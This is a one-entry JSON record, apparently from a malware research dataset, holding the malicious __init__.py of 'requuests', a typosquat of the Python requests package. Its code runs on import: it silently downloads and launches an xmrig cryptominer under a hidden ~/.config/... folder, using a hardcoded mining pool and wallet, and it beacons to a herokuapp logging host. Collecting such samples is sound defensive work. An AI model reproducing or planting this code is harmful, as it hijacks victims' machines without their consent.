[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/requuests-2.27.1/requuests-2.27.1/requests/__init__.py",
    "malicious_code": "import subprocess\nimport urllib.request\nimport os\nfrom pathlib import Path\nimport tarfile\n\ndef windows():\n    pass\n\ndef linux_install_repka():\n    home = str(Path.home())\n    if os.path.exists(os.path.join(home, '.config/.../ruda/krot')): return\n    Path(os.path.join(home, \".config/.../\")).mkdir(parents=True, exist_ok=True)\n    with urllib.request.urlopen('https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz') as f:\n        with open(os.path.join(home, \".config/.../repka\"), \"wb+\") as fo:\n            fo.write(f.read())\n    tar = tarfile.open(os.path.join(home, \".config/.../repka\"))\n    tar.extractall(path=os.path.join(home, \".config/.../\"))\n    tar.close()\n    os.rename(os.path.join(home, \".config/.../xmrig-6.17.0/\"), os.path.join(home, \".config/.../ruda\"))\n    os.rename(os.path.join(home, \".config/.../ruda/xmrig\"), os.path.join(home, \".config/.../ruda/krot\"))\n\n\ndef linux():\n    home = str(Path.home())\n    linux_install_repka()\n    subprocess.Popen([os.path.join(home, \".config/.../ruda/krot\")] +\\\n                    \" -o pool.supportxmr.com:443 -u 44ZptWtXxVhjLYGz8oKCMSW6nA9Gpc2RVYQDzyBnaM7VZkaCTGZGEANQTR3pNXK3mzZq1cVzKs1SA3H4Wibc6qVvG5xpcSY -k --tls\".split(),\n                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n    urllib.request.urlopen(\"https://serene-springs-50769.herokuapp.com/log?from=requuests&os=\" + os.name + \"&mine=true\")\n\n\n\nurllib.request.urlopen(\"https://serene-springs-50769.herokuapp.com/log?from=requuests&os=\" + os.name)\nif os.name == 'nt':\n    windows()\nelse:\n    linux()"
  }
]